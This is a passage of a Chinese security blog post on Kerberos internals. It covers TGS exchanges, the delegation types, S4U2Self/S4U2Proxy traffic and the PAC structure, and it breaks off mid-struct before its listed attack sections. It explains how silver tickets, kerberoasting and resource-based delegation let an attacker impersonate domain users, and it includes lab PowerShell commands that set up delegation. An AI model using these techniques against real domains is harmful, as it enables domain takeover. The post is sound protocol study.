+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/self209"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:2662686939@qq.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    "
+             style="background-image:url('/2022/02/25/20220225/837657.jpg');"
+             data-behavior="5">
+            
+                <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            内网安全之kerberos(二)
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2022-02-25T14:58:23+08:00">
+	
+		    2月 25, 2022
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+            
+        </div>
+
+            <div id="main" data-behavior="5"
+                 class="hasCover
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>参考：<a target="_blank" rel="noopener" href="https://github.com/daikerSec/windows_protocol">https://github.com/daikerSec/windows_protocol</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/category_10225019.html">https://blog.csdn.net/qq_36119192/category_10225019.html</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
+<span id="more"></span>
+
+<h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TGS-REQ"><span class="toc-text">TGS_REQ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TGS-REP"><span class="toc-text">TGS_REP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-text">非约束性委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-text">约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#S4U2SELF"><span class="toc-text">S4U2SELF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#S4U2PROXY"><span class="toc-text">S4U2PROXY</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B"><span class="toc-text">约束性委派流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U2SELF%E6%B5%81%E9%87%8F"><span class="toc-text">S4U2SELF流量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U2PROXY%E6%B5%81%E9%87%8F"><span class="toc-text">S4U2PROXY流量</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">基于资源的约束委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-text">PAC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PAC%E7%BB%93%E6%9E%84"><span class="toc-text">PAC结构</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-text">相关安全问题及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-the-ticket"><span class="toc-text">pass the ticket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerberosting"><span class="toc-text">kerberosting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rubeus%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE"><span class="toc-text">rubeus请求服务票据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">非约束委派攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">约束委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kekeo%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">kekeo约束委派攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">基于资源的约束委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#impacket%E8%BF%9B%E8%A1%8C%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">impacket进行基于资源的约束性委派攻击</span></a></li></ol></li></ol></li></ol>
+
+<h3 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h3><p>用户通过AS_REP拿到的TGT票据，以及使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。去向KDC申请特定服务的访问权限，KDC校验TGT票据</p>
+<p><img src="image-20220405202010600.png" alt="image-20220405202010600"></p>
+<p>流量包：</p>
+<p><img src="image-20220405202127508.png" alt="image-20220405202127508"></p>
+<ol>
+<li><strong>msg-type</strong></li>
+</ol>
+<p>类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)</p>
+<ol start="2">
+<li><strong>PA-DATA</strong></li>
+</ol>
+<p>正常的TGS_REQ的请求需要用到有</p>
+<ul>
+<li><p>AP-REQ</p>
+<p>这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据和Session Key加密的客户端信息跟时间戳，就放在这个结构体里面。</p>
+</li>
+</ul>
+<p><img src="image-20220405202452052.png" alt="image-20220405202452052"></p>
+<ul>
+<li><p>PA_FOR_USER</p>
+<p><img src="image-20220405202937345.png" alt="image-20220405202937345"></p>
+<p>值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。</p>
+<p>S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</p>
+<p>* </p>
+</li>
+<li><p>PA_PAC_OPTIONS</p>
+<p><img src="image-20220405203036805.png" alt="image-20220405203036805"></p>
+<p>类型是 PA_PAC_OPTIONS</p>
+<p>值是以下flag的组合</p>
+<p> – Claims(0)</p>
+<p> – Branch Aware(1)</p>
+<p> – Forward to Full DC(2)</p>
+<p> – Resource-based Constrained Delegation (3)</p>
+<p>微软的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aeecfd82-a5e4-474c-92ab-8df9022cf955">MS-SFU 2.2.5</a>， S4U2proxy 必须扩展PA-PAC-OPTIONS结构。</p>
+<p>如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。</p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>REQ_BODY</strong></li>
+</ol>
+<ul>
+<li><p>sname</p>
+<p>这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</p>
+</li>
+<li><p>AddtionTicket</p>
+<p><img src="image-20220405203316324.png" alt="image-20220405203316324"></p>
+<p>附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</p>
+</li>
+</ul>
+<h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h3><p><img src="image-20220405203848843.png" alt="image-20220405203848843"></p>
+<ol>
+<li><p><strong>msg-type</strong></p>
+<p>AS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)</p>
+</li>
+<li><p><strong>ticket</strong></p>
+<p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash，既kerberoasting</p>
+<p><img src="image-20220405204251250.png" alt="image-20220405204251250"></p>
+</li>
+<li><p><strong>enc_part</strong></p>
+<p>这个enc_part不是ticket里面的enc_part，这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</p>
+</li>
+</ol>
+<p><img src="image-20220405204334935.png" alt="image-20220405204334935"></p>
+<h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><p>对于非约束性委派(Unconstrained Delegation)，服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。</p>
+<p>配置了非约束性委派属性的机器账号的userAccountControl 属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT | </p>
+<p>TRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。</p>
+<p><img src="image-20220406101111523.png" alt="image-20220406101111523"></p>
+<p>配置了非约束性委派属性的服务账号的userAccountControl 属性有个FLAG位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， </p>
+<p>其对应的数是0x80200=524800。 </p>
+<p><img src="image-20220406101332015.png" alt="image-20220406101332015"></p>
+<p>非约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。</p>
+<p>非约束委派的配置如下</p>
+<p>将域用户注册为服务账户</p>
+<p><img src="image-20220406095732365.png" alt="image-20220406095732365"></p>
+<p>配置非约束委派</p>
+<p><img src="image-20220406095814113.png" alt="image-20220406095814113"></p>
+<h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><p>由于非约束性委派的不安全性，微软在Windows Server 2003中发布了约束性委派。同时，为了在Kerberos协议层面对约束性委派的支持， </p>
+<p>微软扩展了两个子协议 S4u2self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )。对于约束性委派（Constrained </p>
+<p>Delegation），服务账号只能获取该用户的ST服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的msDS- </p>
+<p>AllowedToDelegateTo属性会指定对哪个SPN进行委派。约束委派的设置需要 SeEnableDelegation 特权，该特权通常仅授予域管理员。</p>
+<p>配置了非约束性委派的机器账号的userAccountControl属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT | </p>
+<p>TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312。 </p>
+<p><img src="image-20220406102331409.png" alt="image-20220406102331409"></p>
+<p><img src="image-20220406102437345.png" alt="image-20220406102437345"></p>
+<p>配置了非约束性委派的服务账号的userAccountControl属性有个FLAG位 NORMAL_ACCOUNT | </p>
+<p>TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1000200=16777728。</p>
+<p><img src="image-20220406102552379.png" alt="image-20220406102552379"></p>
+<p><img src="image-20220406102649696.png" alt="image-20220406102649696"></p>
+<h4 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h4><p>当用户以其他方式(如NTLMi认证、基于表单的认证等方式)与Web服务进行认证后，用户是无法向Server1服务器提供请求该服务的TGS服务票据的，因而服务器也无法进一步使用S4U2Proxy协议请求访问域控的CIFS服务。S4U2Self协议便是解决该问题的方案，被配置为约束委派的服务能够<strong>调用S4U2Self向KDC为任意用户请求访问自身的可转发的服务票据</strong>，此后，便可通过S4U2Proxy使用这张TGS票据向域控制器请求访问域控的CIFS服务的票据。这里需要注意的是服务代表用户获得针对服务自身TGS票据这个过程是不需要用户的凭据的。<br>S42Self的过程如图(请求服务之前需要申请可转发的TGT，即需要向域控认证账户密码)</p>
+<p><img src="image-20220407103333591.png" alt="image-20220407103333591"></p>
+<h4 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h4><p>S4U2Proxy使得Server1可以使用来自用户的授权(在S4U2self阶段获得)，然后用该TGS票据(放在AdationTicket里面)向KD请求访问域控的CIFS服务的TGS，并且代表用户访问域控的CIFS服务，而且只能访问域控的CIFS服务。</p>
+<p><img src="image-20220407103822645.png" alt="image-20220407103822645"></p>
+<h4 id="约束性委派流程"><a href="#约束性委派流程" class="headerlink" title="约束性委派流程"></a>约束性委派流程</h4><p>为了进行约束性委派，微软在Kerberos 协议的TGS_REQ &amp; TGS_REP阶段引入了两个扩展子协议S4u2Self (Service for User to Self)和S4u2Proxy(Service for User to Proxy )。</p>
+<p>S4u2self可以代表任意用户请求针对其自身的Kerberos服务票据(ST);</p>
+<p>S4u2Proxy可以以上一步用户的名义请求其它服务的服务票据。约束性委派就是限制了S4u2Proxy扩展的范围。</p>
+<p>来捋一下整个流程</p>
+<p><img src="image-20220407102148702.png" alt="image-20220407102148702"></p>
+<p>在Server1上配置到域控的CIFS服务约束性委派</p>
+<p><img src="image-20220407102440866.png" alt="image-20220407102440866"></p>
+<ol>
+<li>用户访问Server1，于是向域控进行kerberos认证，域控返回可转发的TGS服务票据给用户，用户使用此服务票据访问Server1(上图中的第1、2、3步)</li>
+<li>若该Server1允许委派给域控的CIFS服务，并且使用Kerberos协议认证请求Server1，则Server1能使用S42Proxy协议将用户发送给自己的可转发的TGS服务票据以用户的身份再转发给域控制器，向域控申请访问CIFS服务的TGS服务票据，于是域控返回给Server1─个域控的CIFS服务的TGS服务票据（上图中的第6步）。若用户以其他方式(如NTLMi认证、基于表单的认证等方式)与Server1服务进行认证后，用户是无法向Server1服务器提供请求该服务的可转发TGS服务票据的，这时候S4U2Self协议便是解决该问题的方案，被配置为约束委派的服务能够<strong>调用S4U2Self向KDC为任意用户请求访问自身的可转发的服务票据</strong>（上图中的第4、5步），使用S42Proxy协议将S4U2Self协议申请的可转发的TGS服务票据以用户的身份再转发给域控制器，向域控申请访问CIFS服务的TGS服务票据(上图第6步)</li>
+<li>Server1便能使用获得的域控的CIFS服务的TGS服务票据以用户的身份访问域控的CIFS服务。（上图中的第7步）</li>
+</ol>
+<p>从网络攻击的角度来看，如果攻击者控制了Server1的账号，并且Server1配置了到域控的CIFS服务的约束性委派。则攻击者可以利用Server1以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
+<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p><img src="image-20220407112250852.png" alt="image-20220407112250852"></p>
+<h5 id="S4U2SELF流量"><a href="#S4U2SELF流量" class="headerlink" title="S4U2SELF流量"></a>S4U2SELF流量</h5><p>S4U2self请求流量，也就是上面约束委派流程图的第4、5步</p>
+<p><img src="image-20220407112818256.png" alt="image-20220407112818256"></p>
+<ol>
+<li>先向KDC申请服务自身的可转发的TGT票据</li>
+</ol>
+<p><img src="image-20220407113515778.png" alt="image-20220407113515778"></p>
+<p><img src="image-20220407113605301.png" alt="image-20220407113605301"></p>
+<p>2、返回可转发TGT票据</p>
+<p><img src="image-20220407113741485.png" alt="image-20220407113741485"></p>
+<p>上图的票据cipher为aa7d6d6b79d0…..</p>
+<p>我们可以使用daiker大佬的工具查看这张TGT票据</p>
+<p>cipher是一样的说明是这张，可以解密看一下它的flags字段有一个forwardable的值代表可转发</p>
+<p><img src="image-20220407114013191.png" alt="image-20220407114013191"></p>
+<p><img src="image-20220407114243719.png" alt="image-20220407114243719"></p>
+<p>3、携带着可转发TGT票据，代表administrator用户获得针对服务自身的可转发TGS票据</p>
+<p><img src="image-20220407123537020.png" alt="image-20220407123537020"></p>
+<p><img src="image-20220407123802655.png" alt="image-20220407123802655"></p>
+<p><img src="image-20220407123700199.png" alt="image-20220407123700199"></p>
+<p>4、返回用户administrator请求服务自身的可转发TGS票据</p>
+<p><img src="image-20220407124149988.png" alt="image-20220407124149988"></p>
+<p>票据的cipher值为dfdc318f3564931……</p>
+<h5 id="S4U2PROXY流量"><a href="#S4U2PROXY流量" class="headerlink" title="S4U2PROXY流量"></a>S4U2PROXY流量</h5><p><img src="image-20220407130021730.png" alt="image-20220407130021730"></p>
+<p>1、携带着可转发TGT票据以及S4U2Self协议申请administrator用户针对服务自身的可转发的TGS服务票据以用户的身份再转发给域控制器，TGS票据放在AdationTicket里面，向域控申请访问CIFS服务的TGS服务票据。</p>
+<p>可转发TGT票据在pA-TGE-REQ字段下的ap-req字段中</p>
+<p><img src="image-20220407125215017.png" alt="image-20220407125215017"></p>
+<p>TGS票据放在req-body的AdationTicket字段中</p>
+<p><img src="image-20220407125332900.png" alt="image-20220407125332900"></p>
+<p>向域控申请访问CIFS服务的TGS服务票据。</p>
+<p><img src="image-20220407125923621.png" alt="image-20220407125923621"></p>
+<p>2、返回administator用户访问CIFS服务的TGS服务票据</p>
+<p><img src="image-20220407130200025.png" alt="image-20220407130200025"></p>
+<p>3、将票据注入内存中，代表用户访问域控的CIFS服务</p>
+<p><img src="image-20220407110129251.png" alt="image-20220407110129251"></p>
+<p><img src="image-20220407110215952.png" alt="image-20220407110215952"></p>
+<p>SMB协议中带着CIFS服务的TGS服务票据</p>
+<p><img src="image-20220407130924830.png" alt="image-20220407130924830"></p>
+<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><p>为了使用户资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设 置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能 在运行Windows Server 2012和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约 束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许委派账号的SID，并且委派属性这里没有任何值。基于资源的约束委派和约束性委派请求流程基本一致，唯一的区别在于S4U2SELF这一步请求的TGS是不可转发的无论服务账号的UserAccountControl属性是否被设置为TrustedToAuthForDelegation值，服务自身都可以通过调用S4U2Self来为任意用户请求自身的服务票据。但是当没有设置该属性时，KDC通过检查服务账号的TrustedToHuthForDelegation位和msDS-AllowedToDelegateTo这两个字段，发现没有被赋值，所以服务自身通过S4U2Self请求到的TGS服务票据是不可转发的，因此不可转发的TGS服务票据是无法通过S4U2Proxy转发到其他服务进行约束性委派认证的。但是在基于资源的约束委派过程中，不可转发的TGS服务票据仍然可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后服务还会返回一张可转发的TGS服务票据!因此，如果我们能够在域控上配置允许server1的基于资源的约束委派，那么我们就可以通过控制server1使用S4U2Self向域控请求任意用户访问自身的服务票据,最后再使用S4U2Proxy转发此TGS票据去请求访问域控的可转发的TGS服务票据，那么我们就可以模拟任意用户访问域控了。这里我们可以以普通域用户的身份去创建机器账号作为server1。</p>
+<p>前提：这里实验我们手动上域控配置基于资源的约束委派</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ADComputer WIN-4QH1BAMD7NP -Properties PrincipalsAllowedToDelegateToAccount</span><br><span class="line">Set-ADComputer WIN-4QH1BAMD7NP -PrincipalsAllowedToDelegateToAccount server1$</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220407235244150.png" alt="image-20220407235244150"></p>
+<p>S4U2Self请求到的TGS服务票据是不可转发的</p>
+<p><img src="image-20220407234722105.png" alt="image-20220407234722105"></p>
+<p>S4U2Proxy认证返回可转发的TGS服务票据</p>
+<p><img src="image-20220407234947687.png" alt="image-20220407234947687"></p>
+<h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><h4 id="PAC结构"><a href="#PAC结构" class="headerlink" title="PAC结构"></a>PAC结构</h4><p>PAC的结构如下图所示。</p>
+<p><img src="image001.png" alt="img"></p>
+<p>PAC整体的结构上是一个AuthorizationData的结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;</span><br><span class="line">              ad-type         [0] Int32,</span><br><span class="line">              ad-data         [1] OCTET STRING</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>AuthorizationData结构的ad-type主要有以下几个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AD-IF-RELEVANT                     1</span><br><span class="line">AD-INTENDED-FOR-SERVER             2</span><br><span class="line">AD-INTENDED-FOR-APPLICATION-CLASS  3</span><br><span class="line">AD-KDC-ISSUED                      4</span><br><span class="line">AD-AND-OR                          5</span><br><span class="line">AD-MANDATORY-TICKET-EXTENSIONS     6</span><br><span class="line">AD-IN-TICKET-EXTENSIONS            7</span><br><span class="line">AD-MANDATORY-FOR-KDC               8</span><br><span class="line">Reserved values                 9-63</span><br><span class="line">OSF-DCE                           64</span><br><span class="line">SESAME                            65</span><br><span class="line">AD-OSF-DCE-PKI-CERTID             66 (hemsath @us.ibm.com)</span><br><span class="line">AD-WIN2K-PAC                     128 (jbrezak @exchange.microsoft.com)</span><br><span class="line">AD-ETYPE-NEGOTIATION             129  (lzhu @windows.microsoft.com)</span><br></pre></td></tr></table></figure>
+
+<p>如上图所示，整个PAC最外层的ad-type为<code>AD-IF-RELEVANT</code>，ad-data还是一个AuthorizationData结构。</p>
+<p>这个AuthorizationData的ad-type 为<code>AD-WIN2K-PAC</code>，ad-data为一段连续的空间，</p>
+<p>这段空间包含一个头部<code>PACTYPE</code>以及若干个<code>PAC_INFO_BUFFER</code></p>
+<p>头部PACTYPE包括<code>cBuffers</code>,<code>版本</code>以及<code>缓冲区</code>，<code>PAC_INFO_BUFFER</code>为key-value型的</p>
+<p>key 的类型如下表所示</p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00000001</td>
+<td align="left">登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x00000002</td>
+<td align="left">凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x00000006</td>
+<td align="left">服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x00000007</td>
+<td align="left">KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x0000000A</td>
+<td align="left">客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x0000000B</td>
+<td align="left">受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x0000000C</td>
+<td align="left">用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>
+</tr>
+<tr>
+<td align="left">0x0000000D</td>
+<td align="left">客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x0000000E</td>
+<td align="left">设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>
+</tr>
+<tr>
+<td align="left">0x0000000F</td>
+<td align="left">设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>
+</tr>
+</tbody></table>
+<p>下面详细介绍四个比较重要的</p>
+<ul>
+<li>0x00000001   <strong>KERB_VALIDATION_INFO</strong>  </li>
+</ul>
+<p>这个结构是登录信息，也是整个PAC最重要的部分，整个PAC就靠它来验证用户身份了，是个结构体，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">   FILETIME LogonTime;</span><br><span class="line">   FILETIME LogoffTime;</span><br><span class="line">   FILETIME KickOffTime;</span><br><span class="line">   FILETIME PasswordLastSet;</span><br><span class="line">   FILETIME PasswordCanChange;</span><br><span class="line">   FILETIME PasswordMustChange;</span><br><span class="line">   RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">   RPC_UNICODE_STRING FullName;</span><br><span class="line">   RPC_UNICODE_STRING LogonScript;</span><br><span class="line">   RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">   RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">   USHORT LogonCount;</span><br><span class="line">   USHORT BadPasswordCount;</span><br><span class="line">   ULONG UserId; //用户的sid</span><br><span class="line">   